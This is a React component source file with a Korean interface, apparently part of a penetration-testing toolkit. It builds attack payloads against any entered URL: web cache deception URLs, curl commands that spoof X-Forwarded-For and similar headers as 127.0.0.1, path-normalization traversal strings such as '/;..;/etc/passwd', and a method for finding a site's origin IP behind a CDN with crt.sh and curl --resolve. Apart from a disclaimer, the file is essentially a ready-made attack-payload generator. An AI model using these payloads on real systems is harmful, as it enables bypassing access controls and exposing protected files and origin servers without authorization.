import { useState } from 'react'
import { DISCLAIMER, Note, TextInput, Readout } from './shared'

export function CdnProxyBypassBuilder() {
  const [url, setUrl] = useState('')
  const trimmed = url.trim()
  const target = trimmed || 'https://TARGET'
  const domain = (trimmed || 'TARGET.COM').replace(/^https?:\/\//, '').replace(/\/.*$/, '')

  const wcdVariants = [
    { label: 'CSS Static', ext: '.css' },
    { label: 'JS Static', ext: '.js' },
    { label: 'Image Static', ext: '.jpg' },
    { label: 'Text Static', ext: '.txt' },
  ]

  const spoofHeaders = [
    { header: 'X-Forwarded-For', val: '127.0.0.1' },
    { header: 'X-Real-IP', val: '127.0.0.1' },
    { header: 'X-Originating-IP', val: '127.0.0.1' },
    { header: 'X-Client-IP', val: '127.0.0.1' },
    { header: 'True-Client-IP', val: '127.0.0.1' },
  ]

  const normVariants = [
    { label: 'Semicolon Normalization', code: '/;..;/etc/passwd' },
    { label: 'Path Segment Bypass', code: '/%2e%2e%2f' },
    { label: 'Double Dot Encoding', code: '/..%2f' },
  ]

  return (
    <div className="payload-builder">
      <Note>{DISCLAIMER}</Note>
      <TextInput label="대상 URL" value={url} onChange={setUrl} placeholder="https://example.com" />

      <div className="payload-readout-group">
        <strong className="payload-group-title">Web Cache Deception (WCD) 변형</strong>
        {wcdVariants.map((v, i) => (
          <Readout key={i} title={v.label} value={`${target}${v.ext}`} wrap="anywhere" />
        ))}
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">IP 스푸핑 헤더 조합 (curl)</strong>
        {spoofHeaders.map((h, i) => (
          <Readout key={i} title={h.header} value={`curl -H "${h.header}: ${h.val}" ${target}`} wrap="anywhere" />
        ))}
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">경로 정규화 불일치 (ACL 우회)</strong>
        {normVariants.map((v, i) => (
          <Readout key={i} title={v.label} value={`${target}${v.code}`} wrap="anywhere" />
        ))}
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">CDN 뒤 원본 IP 탐색</strong>
        <Readout title="crt.sh 인증서 검색" value={`https://crt.sh/?q=%25.${domain}`} wrap="anywhere" />
        <Note>crt.sh의 인증서 이름에서 서브도메인과 원본 노출 후보를 확인하고, SecurityTrails·Censys 등의 과거 DNS 레코드로 CDN 적용 전 IP 후보를 교차 확인합니다.</Note>
        <Readout title="HTTP로 원본 IP 후보 확인 (Host 헤더)" value={`curl -sS -H "Host: ${domain}" http://[원본 IP 후보]/`} wrap="anywhere" />
        <Readout title="HTTPS로 원본 IP 후보 확인 (--resolve, SNI 포함)" value={`curl -sSk --resolve ${domain}:443:[원본 IP 후보] https://${domain}/`} wrap="anywhere" />
        <Note>HTTPS는 Host 헤더만 바꿔서는 TLS SNI/인증서 검증이 그대로 원래 호스트명을 안 쓰기 때문에 결과가 왜곡됩니다. --resolve로 도메인을 IP 후보에 강제 매핑해야 SNI까지 맞게 접속됩니다(-k는 인증서가 해당 IP용이 아니라 경고가 날 수 있어 추가).</Note>
      </div>
    </div>
  )
}

export default CdnProxyBypassBuilder
